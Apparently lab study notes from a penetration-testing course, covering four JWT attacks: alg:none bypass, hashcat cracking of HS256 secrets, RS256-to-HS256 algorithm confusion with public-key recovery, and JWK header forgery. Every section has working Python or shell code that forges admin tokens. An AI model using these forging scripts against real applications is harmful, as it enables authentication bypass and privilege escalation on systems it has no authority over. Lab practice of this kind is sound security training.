# JWT Attacks

Four distinct vulnerabilities, each requiring a different approach. The attack surface is the JWT library's handling of the `alg` field and the key material used for verification.

---

## alg:none — Signature Bypass

The simplest attack. If the server accepts a JWT with `"alg":"none"`, it treats the token as unsigned and skips verification entirely.

**Steps:**
1. Log in, capture the JWT from the `Set-Cookie` response.
2. Decode the header and payload (base64url, no padding).
3. Change the header to `{"alg":"none","typ":"JWT"}`.
4. Modify the payload however you want (e.g., `"isAdmin":true`).
5. Re-encode both parts (base64url, no padding).
6. The signature segment must be empty but the trailing `.` is required: `header.payload.`
7. Send the crafted session cookie.

**Common mistake:** Omitting the trailing dot. The format is `H.P.S` — with `alg:none`, `S` is empty but the dot must still be there.

The server checks `alg` in the header to decide which verifier to call. If `none` maps to a no-op verifier (or has no mapping), the signature check is skipped. Good JWT libraries reject `none` at the framework level; bad ones don't.

---

## HS256 Signing Secret — Hashcat Crack

When a server uses HS256 with a weak, guessable secret, the secret is recoverable offline.

**Steps:**
1. Capture the JWT — the full `header.payload.signature` string.
2. Feed it to hashcat with mode 16500 (JWT):
   ```bash
   hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
   ```
3. Once cracked, forge a new JWT with the payload you want, sign it with the same secret:
   ```python
   import jwt, base64, hmac, hashlib

   secret = "cracked_secret"
   header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b'=')
   payload = base64.urlsafe_b64encode(b'{"user":"htb-stdnt","isAdmin":true,"exp":9999999999}').rstrip(b'=')
   sig_input = header + b'.' + payload
   sig = base64.urlsafe_b64encode(
       hmac.new(secret.encode(), sig_input, hashlib.sha256).digest()
   ).rstrip(b'=')
   print((sig_input + b'.' + sig).decode())
   ```

PyJWT's `encode()` also works if you just want a clean token without manual base64 manipulation.

**What makes this work:** HS256 is symmetric — the same secret signs and verifies. There's no private key to protect. If the secret is in rockyou.txt, it's crackable in minutes.

---

## RS256 → HS256 Algorithm Confusion

The subtlest of the JWT attacks. The server was designed for RS256 (asymmetric), but it accepts tokens with `alg` set to HS256 without pinning the algorithm. The attack is:

> Sign a HS256 token using the RSA *public key* as the HMAC secret. The server reads `alg:HS256`, retrieves "the key", and if it's using the public key bytes as the HMAC key, verification passes.

**The key recovery step** is the hard part — you don't have the public key directly. Use `rsa_sign2n` to recover it from two JWT signatures with the same private key:

```bash
# First get two JWTs by logging in twice (different exp values)
J1="<first_jwt>"
J2="<second_jwt>"

# Run rsa_sign2n (Docker)
docker run --rm rsa_sign2n -c "uv run jwt_forgery.py '$J1' '$J2'"
```

The tool outputs 4 candidate tampered JWTs (combinations of mult={1,3} and key format={x509, pkcs1}). Test each against the server — the one that returns a non-redirect 200 (even if it says "not admin") identifies the correct public key format.

**Forge the admin token:**
```python
import hmac, hashlib, base64, json

# Load the confirmed PEM (with its trailing \n)
pubkey = open('pubkey.pem', 'rb').read()

header_json  = json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')).encode()
payload_json = json.dumps({"user":"htb-stdnt","isAdmin":True,"exp":9999999999}, separators=(',',':')).encode()

H = base64.urlsafe_b64encode(header_json).rstrip(b'=')
P = base64.urlsafe_b64encode(payload_json).rstrip(b'=')

sig = hmac.new(pubkey, H + b'.' + P, hashlib.sha256).digest()
S   = base64.urlsafe_b64encode(sig).rstrip(b'=')

print((H + b'.' + P + b'.' + S).decode())
```

**Critical detail:** The PEM bytes must match exactly — including the trailing newline. Passing the PEM through shell substitution (`$(cat pem)`) strips the final `\n`. Always read the file in binary mode in Python.

**The two PEM formats to try:** x509 SubjectPublicKeyInfo vs. PKCS#1 RSAPublicKey. Most JWT libraries that are vulnerable to this attack use x509 (the `-----BEGIN PUBLIC KEY-----` format, not `-----BEGIN RSA PUBLIC KEY-----`). Try x509 first.

---

## JWK Header Forgery

Some JWT implementations trust the key embedded in the token's own `jwk` header parameter. If the server uses `header.jwk` as the verification key, you can embed your own public key, sign the JWT with your matching private key, and the server will verify against your key.

**Steps:**
1. Generate an RSA keypair:
   ```bash
   openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048
   openssl rsa -pubout -in private.pem -out public.pem
   ```
2. Construct the forged JWT:
   ```python
   from jose import jwt as jose_jwt
   from jwcrypto import jwk

   priv = open('private.pem', 'rb').read()
   pub  = open('public.pem',  'rb').read()

   pub_jwk = jwk.JWK.from_pem(pub)
   pub_dict = pub_jwk.export_public(as_dict=True)

   token = jose_jwt.encode(
       {"user": "htb-stdnt", "isAdmin": True, "exp": 9999999999},
       priv,
       algorithm="RS256",
       headers={"jwk": pub_dict}
   )
   print(token)
   ```
3. Send the forged token.

**Note:** Servers that display the `jwk` header in the login response may not actually use it for verification — it could be decorative. If this attack fails, fall back to algorithm confusion using the `n` and `e` values from the `jwk` header to reconstruct the real public key.

---

## Skills Assessment — Algorithm Confusion on a JWK-Bearing Token

The skills assessment combines elements from the above labs. The token uses RS256 and the header includes a `jwk` with the server's RSA public key. The attack path:

1. **Decode the JWT header** to extract `n` and `e` from the embedded JWK.
2. **Reconstruct the RSA public key** from those values:
   ```python
   from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
   from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
   import base64, struct

   def b64url_to_int(s):
       padding = 4 - len(s) % 4
       return int.from_bytes(base64.urlsafe_b64decode(s + '=' * padding), 'big')

   e = b64url_to_int(jwk_dict['e'])
   n = b64url_to_int(jwk_dict['n'])
   pub = RSAPublicNumbers(e, n).public_key()
   pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)  # ends in \n
   ```
3. **Forge with algorithm confusion** — sign a HS256 token using `pem` as the HMAC-SHA256 secret, with the admin payload.
4. The `jwk` header on the original token was informational — the server's actual verification key is derived from the server-side RSA private key, not from what the token claims.

The server accepted **x509 PEM with trailing newline** as the HMAC key. All other variants (PKCS1 PEM, x509 DER, raw modulus bytes, PEM without the final `\n`) rejected.

---

## General Notes

- Always preserve exact exp values from the original token — some servers reject tokens where exp has shifted by more than a few minutes.
- The `alg:none` and JWK attacks are often blocked by modern libraries. Algorithm confusion is the one that still requires manual bypass.
- When cracking HS256 with hashcat: the crack is per-token format. If the JWT uses dots correctly and hashcat still fails, double-check there's no base64 padding in the token you pasted.
- `python-jwt`, `PyJWT`, `jsonwebtoken` (Node) all had history with algorithm confusion bugs. The libraries are patched now but the *applications using them* may not have been updated.
